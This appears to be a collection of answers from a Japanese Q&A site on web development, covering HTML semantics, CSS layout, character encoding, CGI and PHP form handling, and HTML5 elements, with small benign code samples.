div.section table{ border-collapse:collapse; background-color:white; width:100%; } div.section table td{border:solid 1px gray;} --> ＿</style> </head> <body> ＿<div class="section"> ＿＿<table border="1" summary="何とかの表"><!-- summaryは必須 --> ＿＿＿<tbody><!-- tbodyは原則必須です --> ＿＿＿＿<tr> ＿＿＿＿＿<td colspan="2">１</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<td colspan="2">２</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<td>３</td><td>４</td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿</div> </body> </html>
なんだかjqueryが読み込まれていないように思えますが、まずはそのあたりをチェックしてみてはどうでしょうか？ 読み込んだところで、 　alert($); とでもしてみればわかるかと。
日本語をそのまま URL に入れていませんか？ UTF-8の住所を、URLエンコード(パーセントエンコード)しましょう。 　例：　%e6%9d%b1%e4%ba%ac%e9%83%bd… ちなみに、ie=UTF-8 や ie=Shift_JIS のように、 パラメータで文字コードを指定できます。 http://maps.google.co.jp/maps?q=%e6%9d%b1%e4%ba% … 参考URL：http://tools.ietf.org/html/rfc3986#section-2.1
<a href="tel:電話番号"><img src="画像"></a> 実際に電話をかけられるかどうかは、 mailtoでメールできるかなどと同じ、ブラウザ依存です。
No1です。 ＞ちなみに、Dreamweaverを作っているのですがこの３行が灰色になってしまいます。 <!-- から --> までは、HTMLの文法ではコメントなので、灰色になるのが正常です。 IEは、コメントの中まで読んで、特定の形式のコメント (<!--[if IE]とか) の場合にコメントの一部をコメントで無いと解釈するようになってます。つまり <link rel="stylesheet" type="text/css" href="wholerulesie.css" /> を有効なタグと見なします。 他のブラウザは、<!-- から --> までをすべて無視します。 ＞今度は、逆にfirefoxがIE用のスタイルシートになってしまうのですが…。 なので、これはあり得ません。なんらかの勘違いでしょう。
Macで作られたサンプルじゃないですかね? .DS_Storeで検索すればわかりますが、Mac以外では無視してよいです
フォームを動的に作成するとして・・ 具体的方法は、あとで 　URLの?に続く文字列--#があれば、その前まではQUERY_STRINGと呼ばれるものです。この文字列はサーバーが受け取ったときにQUERY_STRINGという環境変数に取り込まれて処理されます。 　たとえば、googleの検索結果を示すときに query_string - Google 検索 ( https://www.google.co.jp/search?q=QUERY_STRINGS& … ) 　ですね。 具体的な方法ですが、 1) form.html をCGIとして動作させる。 　.htaccessにて、 AddType application/x-httpd-cgi form.html; 　と記述して、CGI自体は 　QUERY_STRINGを解析して、用意したHTMLに書き加える。HTMLは、__END__の後に書いておけば良い 2) form.htmlをPATH_INFOとして与えてCGIを動作させる。 　.htaccessにて、 　DirectoryIndex index.cgi 　とでもして動作させ、index.cgiにて、form.htmlをPATH_INFOとして受け取り、上記と同様にQUERY_STRINGを解析させる。 　いずれの方法も、送信後に入力チェックをしたり、次の入力項目を変化させるなどが可能なため、一般的によく使われる方法です。
仕様書のその部分には、はっきりと書かれています。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　これはHTML5で、HTML4の問題点として随分と議論されてきたところです。結果的にHTML5では、文書構造を示す要素として独立しました。すなわち、HTML4で想定していた「文書に構造を付加するための」class名が、そのまま要素になる。 　具体的には <div class="header">とされてきたものが<header>に、同様に見出しを持つであろう本文記事の<div class="section">は<section>に、<div class="footer">は<footer>に、独立した記事<div class="article">は<article>に、本文地直接関係ないコラムなどは<div class="aside">が<aside>に、挿絵であった<div class="figure">は<figure>・・ 　→3.1. 新しい要素 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) 　たとえば、<a id="body">は、本文と言う意味で悪くは無いかもしれませんが、<a name="myBook">とか、後で見直したとき具体的な内容を示すものが良いでしょう。<p class="br">これは、さすがに・・・ 　たとえば、<font color="red">ここは重要</font>は、<font>は非推奨ですから<span class="red">としたら良い・・・・・と言うわけではありません。もし、あなたがそこが大事なところで赤く表示したいなら、<strong>ここは大事</strong>とか、<span class="mark">ここは大事</span>とマークアップすべきです。後でどのように色やウェイトを変えてもおかしくないでしょう。(ちなみに<mark>もHTML5で追加されます--他から参照される可能性のある語句など) 　idやclass名は伊達じゃない「文書に構造を付加するため」に利用するものです。ここでいう構造は意味的な構造です。<p>が段落、<h1>が見出しと同じ意味。それじゃ足りないからidやclass名をつける。
一般的には、このスライダーなどが人気がありますね。 参考URLをのせますが、「Nivo Slider　使い方」なんかで調べると、わかりやすくいっぱいでてくると思いますよ。他の回答者さんからの回答にもうすでにでていますが、javascriptのjqueryというものです。 参考URL：http://nivo.dev7studios.com/
こんにちは。 No.1さんの言うとおりJavaScriptの動かない環境ではフォームが選択できたりしてしまいますのでおすすめしませんが、サンプルを作ってみました。 (jQueryを併用しています) ==== 動作サンプル http://hppg.moe.hm/okwave/qa/q7413146/ 動作原理としましては 指定されたtrのtd内のdivに半透明のオブジェクトを絶対指定で配置し、覆い被せています。 またselectタグにdisable属性を付与し、選択不可としています。 実用にはもうちょっといろいろ加味しなければいけないと思いますので参考までに。
4.10.16 The progress element ( http://www.w3.org/TR/html5/the-progress-element. … ) 　を使います。 サイトのフォームを多機能にするHTML5の新要素5選（2/2）- ＠IT ( http://www.atmarkit.co.jp/fwcr/design/benkyo/htm … ) <progress>－HTML5タグリファレンス ( http://www.htmq.com/html5/progress.shtml ) プログレスバー.js - JavaScript ライブラリー - HTML5.JP ( http://www.html5.jp/library/progress.html ) 　
#3 です。 marginwidth 属性も IE の独自拡張属性ですが、この属性は frame, iframe 要素に適用できる属性で body 要素には適用できません。 http://msdn.microsoft.com/en-us/library/dd347084 … http://msdn.microsoft.com/en-us/library/dd347091 … つまり、元から無効な属性だったと思われます。 参考までに伺いたいのですが、どの文献を参考にされたのでしょうか？
googleのAdSense広告では、提供ページのリンクから訪問者がある場合、訪問先に課金されると同時にリンク元のページの運用者に配当金が分配されます。その前提として、どのページから訪問したかを把握しなければなりません。 　そのためブラウザは、どのページから訪問したかを、サーバーにファイルを要求するときにその情報を提供します。元々は、サイト管理者にどのページから訪問してきたかを把握することでページの改善や、訪問者により適切な情報を提供するための機能です。 　したがって、サイト管理者が自身の運営しているページのAdSenseをクリックしてしまうと、不正な利益を得ることになりますし、リンク先も余計な費用を支払う羽目になります。 　このリンクの経路をたどる方法には、HTTP_REFERERやCookieを利用する方法があります。サーバーにどのような情報が送信されるかは ★Enviroment Variable and FORM,COOKIE ( http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/axia7 … ) とか・・ 　また、firefoxですと、Live HTTP Headers ( https://addons.mozilla.jp/firefox/details/3829 )を使うとよくわかります。
携帯のブラウザでzipファイルをダウンロードさせることは不可能です。ダウンロードできたとしても閲覧できません。 iPhoneの場合も、何もアプリを入れていない状態ですとzipファイルをダウンロードできません。izipやclipboxなどのアプリを入れましょう。
単純にPHP側で取得したPOSTリクエストをmb_convert_encoding関数を用いてUTF-8に変換してから処理するようにしてみてはどうでしょうか。 入力フォームに問題は見られません。 出力するHTMLにはmetaタグで文字コードを指定してあげるなど、文字化けを防ぐ方法はいろいろあります。 また、そのURLにあるソースを拝見しましたが、処理中にShift-JISに変換しているようですが、UTF-8で書いているのであればこのような変換は無意味ではありませんか？今一度ご確認ください。
javascriptを使う方法も一案ですが、javascriptを使えない--使わない設定にしていると当然無効です。 　もっとも一般的に使われている方法は、PATH_INFOやQUERY_STRINGS、標準入力(STDN)を使って動的にフォーム自体を出力する方法です。 　URLは、ドメイン名+ファイルへのパス+QUERY_STRINGSの組み合わせですから、それをCGIで解釈すれば簡単ですし、入力チェックなど様々に応用が利きます。サーバーがHTTPで要求を受けるとき、QUERY_STRINGS(?の後ろに続く文字列)を環境変数(QUERY_STRINGS)に格納し、ファイルを探し始めますが、そのファイルが無い場合はPATH_INFOに格納して、その上のディレクトリを探します。そこにも無ければ、さらにそれを探していきます。最終的にファイルが見つかり、かつそれが実行ファイルである場合、入手したQUERY_STRINGS,PATH_INFO,STDNを使用して実行しその結果を返します。---一般的なCGIの動作ですね。 　CGIの最後 __END__ の後に、フォームを置いておきます。書き換える必要があるところには、キーワードを入れておきます。 __END__ <!doctype html> <head> <meta charset="utf-8"> <title>フォーム</title> ・・・【中略】・・・ <form action=""> 　<input type="text" name="name" value="__USER_NAME__"> ・・・【中略】・・・ CGI print q~content-type:text/html・・・【中略】・・・~; 　while<DATA>{ 　　s/__USER_NAME__/$userName/; ・・・【中略】・・・ 　入力チェック、メールアドレスの整合性、エラー部分の表示や、そもそものリンク元の情報によってフォームの一部を書き換えるなど応用が利くと思います。どのようなデータを受け取ることができるかは・・ Enviroment Variable and FORM,COOKIE ( http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/peguu … ) とか
やっつけですが、これで対応できるはずです。 出力ソース中261行目の次の部分を書き換えてください。 <li><b>エントリー者には合同・単独セミナー開催のご案内、情報提供をメールにて行います。</b><br /><b>貴方のエントリーをお待ちしてます。</b></a></li> ↓ <li style="width: 420px; padding-top: 20px;"><b>エントリー者には合同・単独セミナー開催のご案内、情報提供をメールにて行います。貴方のエントリーをお待ちしてます。</b></li>
そのエディタで保存するときに「ISO－2022－JP」で保存してしまっているだけでは？ そのまま、 <meta http-equiv="content-type" content="text/html; charset=ISO－2022－JP"> にしたら、きちんと文字化けしないなら・・・ 　もしくは、文字コードの指定より前にASCII以外の文字が入っているとか 　そのページのURLを ★Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) でチェックしてみる。
別にHTML5にこだわらず、階層表示は簡単ですが？？？ text風に表現すると・・ section{margin-left:2em;} これだけで、 section section 　subsection 　　subsubsection section 　subsection となりますけど・・・ 　ついでに4.3.5 カウンタ（Counters） ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … )を使って、章,項,小項でナンバーを振ると良いですね。
連投失礼します。 ソースを拝見しましたが、単に1.aviが正しいパスではないのでは？
　divは汎用ブロックと呼ばれるもので、HTMLで定められている要素では足りないときにclass名と組み合わせて使用されます。 　復習ですが、HTMLは、その文書がどのような構成要素で成り立っているかをマークアップするものです。段落ならp要素、見出しならh1～ h6、引用文ならblockquoteをそれぞれ<p><h1>～<h6><blockquote>、また重要なフレーズでしたらstrong、引用語句でしたらq・・これらはそれぞれ<strong><q>で括られます。ここで前者はブロック要素で、後のものはインライン要素と分けられます。ブラウザの多くは、ブロック要素はその前のブロックとはすこし間を広げて表示されます。 　それぞれの要素には、どんな要素を含みうるかが規定されています。たとえば<p></p>内にブロック要素は含むことができません。 　div要素の中には、ブロック要素もインライン要素も含むことができます（文法的には誤りではないです）が、本来の趣旨からすると、<div>の中にテキストだ突然入るのは誤りです。本来は、7.5.4要素のグループ化: DIV要素とSPAN要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )にあるように、 <DIV id="client-boyera" class="client"> <P><SPAN class="client-title">顧客情報:</SPAN> <TABLE class="client-data"> <TR><TH>名:<TD>Boyera</TR> <TR><TH>姓:<TD>Stephane</TR> <TR><TH>電話:<TD>(212) 555-1212</TR> <TR><TH>Email:<TD>sb@foo.org</TR> </TABLE> </DIV> とかになるはずですね。 　もし、行間を広げるためにdivを使うのでしたら、それは誤りです。あくまで、HTMLは文書をそれが構成されている要素をマークアップするためのもので、デザイン(プレゼンテーション)のためではありません。必要ならスタイルシートで調整しましょう。
実際の実装は、YouTubeを作ったチームの人が情報を公開しない限り、誰にもわからないでしょう。 予想をすると、各動画に複数のタグを設定して、タグの関連度から、関連動画を抽出する仕組みは簡単に思いつきます。実際はもっと複雑だと思いますが。
いわゆるフォームメールと呼ばれるCGIを使います。 たとえば、 ★CGI RESCUE - ネットサーフレスキューＷｅｂ裏技 ( http://www.rescue.ne.jp/ )の下のほうにある「フォーム・アンケート・エディタ ほか」など、このサイトには初心者向けのマニュアルもたくさんあります。 　また、登録すると利用できるサービスもあるようです。 　CGI RESCUE - フォームデコードサービス ( http://www.rescue.ne.jp/form/ ) 　なお、CGIを使わず直接、ブラウザに設定してあるメールユーザーエージェントを起動させて送信させることを想定されているなら、無理です。あくまでブラウザのおまけ機能で、ユーザーによってはまったく使えません。
予定する利用ブラウザがすべて<object>でJavaAppletを実行できるなら<object>の方がいいです。 <applet>でなければ実行できないなら、文字通り、<applet>でなければなりません。
私もobjectタグを使うかで悩んでいます。 幾つか私が思いついた点を述べさせて頂きます。 プロでないので間違っていたらすまません。 １ディレクトリの構成はあっていますか？ 　1.flvがhtmlと同じ場所にないと動かないと思います。 ２codebaseの指定が必要かもしれません。 ３ブラウザがobjectをサポートしてないことがあるそうです。
ホームページビルダーのような、Webオーサリングツール( http://ja.wikipedia.org/wiki/Web%E3%82%AA%E3%83% … )を使おうが使うまいが、HTMLやスタイルシートの知識は絶対必要です。オーサリングツールを使えば、HTMLやスタイルシートの知識は不要と考えていらっしゃるなら、それは誤りです。それどころか、HTMLやスタイルシートの知識がないと、便利なだけにとんでもないページを作成してしまいます。知っていれば、オーサリングツールはとても便利な道具になります。---あまり使うことなくなるかも-- 　というのも、私の仕事の大きな負担になっている作業が、ホームページビルダーで作成されたサイトをウェブ標準に直す作業なのです。多くの場合、テキストだけにして、画像を抜き出して、一からHTMLエディタ ( http://ja.wikipedia.org/wiki/Web%E3%82%AA%E3%83% … )で作り直すことのほうが多いです。完成したページはHTMLもスタイルシートも数分の一のサイズになります。 　これは、コンテンツマネージメントシステム ( http://ja.wikipedia.org/wiki/%E3%82%B3%E3%83%B3% … )を利用してウェブサイトを作成する場合も同様なことがいえます。 　ご存知のように、HTMLはツールでは作成的ない部分があるのです。HTMLは、HyperText Markup Language（ハイパーテキスト マークアップ ランゲージ）の略ですが、それは、ある文書をそれを構成する要素に分解して、どんな要素であるかをマークアップし、他の文書へのリンク機能を持たせる(Hyper---)言語ですから、必然的に！！！、文書から、それぞれの部分がどんな構成要素であるかを読み解き、最適なタグでマークアップしなければなりません。 　すなわち、これは文書の見出しだから、<h1></h1>でマーク、これは引用文だから、<blockquote></blockquote>でマーク、これは重要だから前後を<strong></strong>、ここから、ここまでが段落だから<p></p>で括る。用意されたタグでは足りないときは、この部分全体は、文書のヘッダなので<div class="header"></div>で括り、ここからは本文なので<div class="section"></div>でまとめよう。 　オーサリングツールには、文書を読み取ってそれが文書全体を構成するどんな要素であるかなんて、知る由もないですから、オーサリングツールには不可能なのです。 　また、そうしてきちんとHTMLが書かれていれば、ヘッダー部分の見出しの文字は赤くしようと思えば div.header h1{color:red;} とスタイルシートが書けます。このときもHTMLの知識やスタイルシートの知識がないと不可能なのがわかると思います。オーサリングツールだと、赤くしたい部分をあなたが選択して、デザインメニューから赤を選択すると、意味もなく<h1>にIDでも振ってしまいます。すなわち、HTMLは<h1 id="red">見出し</h1>となり、スタイルシートは#red{color:red;}となるのが関の山・・・これじゃ後でHTMLもCSSもワケワカメ・・・ 　 　オーサリングツールを使おうが使うまいが、HTMLとスタイルシートは、きちんと勉強しましょう。そしたら、自然とツールに頼らなくても作れるようになります。 　とりあえず、下記サイトを通して実習してみなさい。 ★はじめてのWebドキュメントづくり ( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) 　なお、ホームページはブラウザを起動したときに表示されるページのことで、ウェブページやサイト全体の意味で使うと混乱します。たとえば「ホームページに戻る」というと、どこからどこへ行くことですか？ 　利用する立場だと混乱しても問題ではありませんが、作る立場となると色々と支障が出てきます。 ホームページ - Wikipedia ( http://ja.wikipedia.org/wiki/%E3%83%9B%E3%83%BC% … )
FTPというより、ホームページの仕組みですね。 たとえば、質問者さんのパソコンで作ったホームページを不特定多数の人に見てもらう為にはどうすればいいでしょうか。一般的なパソコンは不特定多数の人に見てもらう機能をもっていません。従って、みんなに見てもらうためには、みんなが共通してアクセスできる機能を持った別のパソコンが必要です。そのパソコンを、一般に「サーバー」と呼びます。 FTPとは、サーバーにデータを転送する仕組みのことで、FTPソフトはホームページのデータを転送するときに使います。 従って、同時に、ホームページのデータを置くための、サーバーを借りる・買うなどの契約が別途必要です。
当初、HTML5 の正式勧告は 2022 年とされていました。今から数えても 10 年後ですね。 考えてもみて下さい。1997 年に勧告された HTML 4.0（1999 年に改訂されて HTML 4.01）でさえ、2012 年になった今でも、フルサポートしているブラウザは「ありません」。15 年も経ったのにですよ。 さて、HTML5 の策定グループは、正式勧告までに HTML5 をフルサポートするブラウザを最低 2 つ、という目標を掲げました。上に書いたように、HTML 4.0(1) の歴史を見れば、決して長い時間ではありません。現実的に必要な期間です。 しかし、やがて HTML5 の策定グループは気付きました……こうやって、ブラウザのサポート状況を確認しながら HTML の仕様を作っていくのなら、正式勧告なんてこだわる必要なくね？ そう、HTML5 で大事なのは、HTML の形式よりも、ブラウザの振る舞いの方です。HTML の形式が何であれ、ブラウザがしっかり振る舞えば良い。HTML5 とは、そういう仕様です。ブラウザがちゃんと振る舞えるよう、HTML を正しく書く必要があるのです。 そういうわけで、昨年 2011 年の 1 月、HTML のバージョンは廃止されました。今後は HTML6 も HTML7 も出ません。単に HTML、または HTML 標準と呼ばれます。 まあ、HTML5 の名前も広まってしまったので、当分は HTML5 の名称も使われます。
>しかし、結局のところコンテンツ枠を%指定するのは変わらないので >imgタグで画像を配置する場合に、何pxで作成して配置すればいいのか >という点について、いまいち理解できていないのですがその点は >どうするべきなのでしょうか？ フレキシブルと言っても、3、4パターンくらいを用意する場合がほとんどだと思います。つまり、3、4パターンの画像サイズを用意すればよいということになります。CSSで画像サイズを指定できるのはご存知かと思いますが、何らかの最大画像を用意(たとえば960幅レイアウト用の画像)して、あとは、float落ちした時などにCSSで画像サイズを変更するようにすればよいと思います。 答えになっているでしょうか。
jQueryのスライドショーライブラリを利用されているのであれば、物によってはリンクのhref属性の内容を取得し画像クリック時に飛ばすようになっていて、target指定が無効になるものもあるかもしれませんね。 jQueryのスライドショー以外で、例えばそのスライドショーの下に <a href="http://example.com" target="_top">テスト</a> とでも入れて試して下さい。 これで何の問題も無ければ原因はjQueryのスライドショーにあります。 target属性で指定したものと違う動作をするなんて聞いたことがありません。 ブラウザ固有のバグという可能性も考えられます。 可能であれば、インラインフレームの多重使用は控えるべきです。
様々な要因が考えられますが、よく失敗するのが全角のスペースを入れてしまっている・・とか <p>なんたらかんたら</p> 　 <p>なんたらかんたら</p> 　 とか・・・・この場合、ブラウザは <p>なんたらかんたら</p> <div>　</div> <p>なんたらかんたら</p> <div>　</div> のように解釈します。 ＞HP上の本文の部分に必要のない空白行が増えて 　これが、<p></p>の間の間隔が開きすぎる・・広すぎるという意味の場合は、スタイルシートで調整します。 　日本語の場合、スタイルシートで p{text-indent:1em;margin:0;line-height:1.4em;} とか指定すると良いですが、その場合は、HTMLをマスターするまで放って置くこと・・ ★はじめてのWebドキュメントづくり ( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) 　あたりから、復習してください。
スマートフォンでは解像度が高いので、 iphoneでは横幅640px以上のものを使えばある程度きれいに表示されると思います。 iphoneでは横幅が320pxなので、 約二倍の大きさですね。 画像を320pxで作ってしまうと、 画像が荒れてしまいます＞＜
No.2です。少しわかりにくかったかな? HTMLに改行のためのタグ!!!!重要!!!!HTMLは、文書の整形--プレゼンテーションのためのタグはありません。!!!!。しいて言うなら改行を指定するbrくらい。 　タグは、あくまで文書を構成する上で、その部分がどんな構成要素であるかを示す目印です。それを改行させているのは、ブラウザが持っているスタイルシートです。ですから br{display:none;}とすれば、その要素は消滅してしまいます。 HTMLは、文書を整形するためのもの---たとえば、改行させるため---ではありません。この基本を理解していないと失敗しますよ。
コードだけ見ると問題は無さそうですので、他の部分に原因があるのではないでしょうか。 簡単なサンプルがありましたので掲載しておきます。 一度新規ファイルで試してみて、正常に表示されるようでしたら原因は他のCSSプロパティにあります。一度見なおしてください。 <style> body { background: #CCD6D9 center; margin: 10px 0px; padding: 0px; } .box{ padding: 0px; width: 500px; border: 2px solid #6699FF; margin-right: auto; margin-left: auto; background: #FFFFFF; } .note { font-size:12px; background: url(note.gif) repeat 0px -23px; margin: 20px; padding: 0px 0px 1px; } .note p{ line-height:24px; margin-top:24px; } </style> <body> <div class="box"> <div class="note"> <p> ●タイ伝統古式マッサージ</p> <p>65分コース　5,000円<br> 95分コース　7,000円<br> 125分コース　9,000円</p> <p>●タイ式リフレクソロジー</p> <p>35分コース　3,500円<br> 65分コース　6,000円</p> <p>●アロマオイルトリートメント</p> <p>65分コース　7,000円<br> 95分コース　10,000円<br> 125分コース　13,000円</p> </div> </div> </body>
こんにちは。 ページをまたいで値を保持するならCookieやサーバ側の処理を併用しないといけません。 phpを使える環境であれば、以下のようなソースで実現できると思います。 ようは送信されたデータをもとにselectedを付加する質問者様が言っているような方法です。 各optionの部分にて送信された$skillとの判断を行い、selected="selected"を出力します。 また、チョキを選択させない方法ですが、選んだ時に一度モードを送信すればそのモードにより表示するoptionの中からチョキを表示しないようにすればHTMLだけで実現可能です。 (HTMLだけというのは語弊がありますが、PHPにて出力する内容を変更しているので画面上はHTMLだけで実現します) 以下のサンプルはJavaScriptを併用してグーパが選択された場合にはチョキのoptionに対してdisabledを設定するようにし、選択できないようにしています。 ==== index.php <?php $skill = isset ( $_POST['skill'] ) ? $_POST['skill'] : null; ?> <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitio … <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> <meta http-equiv="Content-Script-Type" content="text/javascript" /> <meta http-equiv="Content-Style-Type" content="text/css" /> <title>【OKWave回答サンプル集】プルダウンメニューのフォームについて</title> <link rel="stylesheet" href="/okwave/qa/css/basic.css" type="text/css" /> <script type="text/javascript"> function modeChange ( mode ) { document.forms['janken'].elements['skill'].options[1].disabled = mode === 'gp'; } </script> <style type="text/css"> </style> </head> <body> <h1>プルダウンメニューのフォームについて(q7383144)</h1> <form name="janken" action="./" method="post"> モード <select name="mode" onchange="modeChange(this.value);"> <option value="janken">ジャンケン</option> <option value="gp">グーパー</option> </select> 手 <select name="skill" size="1"> <option value="goo"<?= $skill==='goo' ? print 'selected="selected"' : '' ?>>グー</option> <option value="choki"<?= $skill==='choki' ? print 'selected="selected"' : '' ?>>チョキ</option> <option value="par"<?= $skill==='par' ? print 'selected="selected"' : '' ?>>パー</option> </select> <input type="submit" value="送信"> </form> </body> </html> <!-- q7383144 -->
独自ドメインで、サイトがパスワード無しで公開されているのなら、Googleを使うと良いと思います。 このあたりを参考に。 https://www.google.co.jp/search?q=google%E6%A4%9 …
両方の仕様に準拠させるなら、HTML4.01strictしかありません。 HTML4.01では、フォーム内のフォームコントロールしか有効でありませんし、form属性はありません。 この場合は、別々のtableにして、スタイルシートで調整することになります。 なぜ、formを外に書かなければならないのですか? 下記は現時点でウェブ標準とみなされている(HTML4.01strict+CSS2.1+DOM+WAI)です。 ★Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) ★W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) で検証済み。 なお、タブは＿に置換済みなので戻すこと。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- table{border:1px solid gray;border-collapse:collapse} form+form table{margin-top:-1px;border-top-width:0;} --> ＿</style> </head> <body> ＿<h1>サンプル</h1> ＿<form id="form1" action="cgi1.cgi" method="POST"> ＿＿<table summary="form1" border="1"> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="name">値(n)</th><td><input type="text" value="text1" tabindex="1" accesskey="n"></td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="name">値(s)</th><td><input type="submit" value="submit1" tabindex="2" accesskey="s"></td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿</form> ＿<form id="form2" action="cgi2.cgi" method="POST"> ＿＿<table summary="form2" border="1"> ＿＿＿<tbody> ＿＿＿＿<tr><th abbr="name">値(a)</th><td><input type="text" value="text2" tabindex="3" accesskey="a"></td></tr> ＿＿＿＿<tr><th abbr="name">値(b)</th><td><input type="submit" value="submit2" tabindex="4" accesskey="b"></td></tr> ＿＿＿</tbody> ＿＿</table> ＿</form> </body> </html>
それはポップアップというよりは、ページ内の右下に内容を表示しているだけですね。 ですからブロックされることも無いのでしょう。 このサイトのものが一番近いと思います。 > http://jsajax.com/Articles/PopupWindowBlue/293 コードを真似してみてください。 popupWinhideAfter = 5000; を変更すると、消えるまでの秒数が指定できます。
あ、変換は勝手にされるのではなく、自前でプログラムするんですよ。 言語によっては変換命令が用意されているし、そうでなければ ライブラリを探すか、文字コードを抽出して自前で変換プログラムを 作成するかのどれかになります。
プルダウンメニューのoptionタグは、CSSが適用されないブラウザも存在します。 携帯の場合はoptionタグへの背景色の指定などもすべて無視されるため、指定したとおりには表示されないのです。 Javascriptなどを使用するとなんとかなるかもしれませんが、 携帯向けにするならあまり凝ったことはしないほうが無難でしょう。 結論としましては、未対応なのでどうしようもありません。
これはプログラムっていうより、サーバ構造とかのお話になるかな。 HTML自体は#1さんがおっしゃる通りプログラムではありません。 文字表記のルールを決めているだけであって、ただのテキストです。 HTTPアクセスでHTMLを見るってのは、サーバからはただHTMLファイルをダウンロードしているにすぎないです。 そのHTMLを構造解析して、ページとして表示しているのはクライアント・・・自分の閲覧しているPCです。 サーバは、クライアントPCからの求めに応じてHTMLファイルを送っているだけなんです。 HTMLをごちゃごちゃするのは自分のPCなわけですから、サーバにファイルを作成することはできません。 ・では、サーバにファイルを作るにはどうするの？ ふつうにHTTPアクセスしてHTML送ってもらうだけでは、上記のとおりサーバはなにも行いません。 でも、サーバにHTTPアクセスしたときに、ただファイルを返信してもらうわけじゃなく、なにかプログラムをサーバで動かしてもらえば、ファイルを作ることができます。 これが一般的にCGIと呼ばれているもので、サーバ側にプログラムを置く必要があります。 上記のとおり、HTMLはプログラムとして作られていませんから、別途言語を利用します。 Perlであったり、PHPであったり。 実際、サーバ側でいろいろな設定を行うことで、 「なんたらかんたら.phpにアクセスされたら、返信行う前に中身を実行する」 という流れをつくるのです。 説明分かりにくいかな・・・ まぁ、こんな感じですから、HTMLだけでは行いたい動作はできません。 ＞winで作ったexeをマックPCほかタブレットPC(win以外）で起動できますか？無理だと思いますけど exe限定であれば、そもそもWinで動くように作られたものにつける拡張しだから、他のOSでは動きません。 WinでもMacでも、場合によってはAndroidでも動くフレームワークがありますので、それをベースにしたアプリケーションであればクロスプラットフォームとして実行できます。 Javaとかはそれを目指してますね。 ただし、機種ごとの差異が激しいため、完全にクロスさせるにはかなりの技術が要ります。結局フレームワークは各OSごとに準備しないといけないですしね・・・。 ま、ファイルパスの違いとかいろいろあるので、何もしなくてもクロスで動くってのを作るのはいろいろ面倒だし、コストに見合わないってのがある。
インラインフレームを使わずに、ｃｓｓでしてしまえばいいのではないでしょうか？ スクロールなどを用いてです。
後方互換を考慮するページなら、botton要素を使うべきです。 form button{ border:none; width:217px; height:41px; cursor:pointer; background-color:white; } <form action=""> <button name="submit" value="送る" type="submit"><img src="images/form_submit.png" alt="送信" width="217" height="41"></button> </form>
　遠い昔は、wgetというこまんどを使ってましたが・・今はfirefoxを使うことが多いです。まず落とせないファイルは無いですね。必要なら、ScrapBook( https://addons.mozilla.jp/firefox/details/427 )というアドオンがあります。 　ブラウザが閲覧時にきちんと表示されるということは、ダウンロードを防ぐ手立ては原理的にありえません。閲覧している時点ですべてダウンロードされているわけですから・・・ 　保存したものだと崩れるとしたら、使用するツールが良くないかと思います。 　まあ、私は 離れた場所にマウスオーバーで画像を変えたい。 - Webデザイン・CSS - 教えて！goo ( http://oshiete.goo.ne.jp/qa/7364249.html ) 　で、私のオリジナルであっても、いくらでもCSSは公開して多くの人に利用してもらいたいほうですから、そのことを深く考えたことはありません。だってウェブを発明したバーナーズリーが 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 私が構想していたのは、自分の知識や考えを共有させることが、他人の知識を 学ぶのと同じくらいに容易であるようなシステムであった。 ・・・【中略】・・・ 　Webは技術的な創造物というよりは社会的な創造物である。私はWebを技術的な おもちゃではなく、人々の共同作業の手助けとなるような社会的効果を生むものとして 設計した。Webの最終目標は、世界中に散らばっている私たちが織りなしている 網の目のような存在を支援し、改善することである。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［よいウェブページを書こうとする人のためのヒント( http://www.sal.tohoku.ac.jp/~gothit/webauthoring … )］より 　 　と述べているように、わたしはその恩恵をたくさん受けているわけですから、少しでも多くの人の参考になって、ほんの小さなことですが恩返しができればと思っています。 　私の稚拙なCSSであっても、世界の誰かは役に立ったと評価してくれるかもしれない。それがウェブです。そのためにウェブサイトを公開しているのです。それが嫌ならウェブの世界には住めません。
